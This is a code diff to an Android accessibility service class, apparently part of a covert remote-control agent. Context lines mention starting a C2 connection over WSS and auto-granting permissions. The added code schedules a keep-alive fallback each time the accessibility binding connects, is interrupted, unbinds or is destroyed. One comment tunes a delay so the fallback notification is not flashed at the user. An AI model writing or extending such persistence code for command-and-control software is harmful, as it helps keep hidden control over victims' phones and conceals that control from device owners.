@@ -57,6 +57,15 @@ class ShadowAccessibilityService : AccessibilityService() {
             Log.e("ShadowA11y", "Failed to enqueue worker", e)
         }
 
+        // a11y is the low-latency path and the cheapest survival path, so the
+        // fallback foreground service is dropped immediately (delay 0 also cancels
+        // any pending "degraded" check that was queued when the binding dropped).
+        try {
+            com.shadow.KeepAlive.schedule(applicationContext, 0L, "a11y connected")
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "KeepAlive schedule failed", e)
+        }
+
         // Start C2 immediately — don't wait for the 15-minute PeriodicWork window.
         // The a11y binding keeps the process alive, so the WSS stays up as long as
         // Android holds the service.
@@ -338,6 +347,11 @@ class ShadowAccessibilityService : AccessibilityService() {
         Log.w("ShadowA11y", "Accessibility Service Interrupted")
         getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
             .edit().putBoolean("a11y_active", false).apply()
+        try {
+            com.shadow.KeepAlive.schedule(applicationContext, 3_000L, "a11y interrupted")
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "KeepAlive schedule failed", e)
+        }
     }
 
     override fun onUnbind(intent: android.content.Intent?): Boolean {
@@ -345,12 +359,29 @@ class ShadowAccessibilityService : AccessibilityService() {
         // instead of operating on a dead service.
         instance = null
         autoGrantActive = false
+        // A short delay, not zero: AMS unbinds and rebinds across a settings change
+        // or an OEM restart of the service, and raising the fallback notification
+        // for a 2-second gap would flash it at the user for nothing. The Rust
+        // heartbeat re-runs the same check every 30s, so a real outage is still
+        // covered even if this callback never fires.
+        try {
+            com.shadow.KeepAlive.schedule(applicationContext, 5_000L, "a11y unbound")
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "KeepAlive schedule failed", e)
+        }
         return super.onUnbind(intent)
     }
 
     override fun onDestroy() {
         instance = null
         autoGrantActive = false
+        try {
+            applicationContext?.let {
+                com.shadow.KeepAlive.schedule(it, 5_000L, "a11y destroyed")
+            }
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "KeepAlive schedule failed", e)
+        }
         super.onDestroy()
     }
 
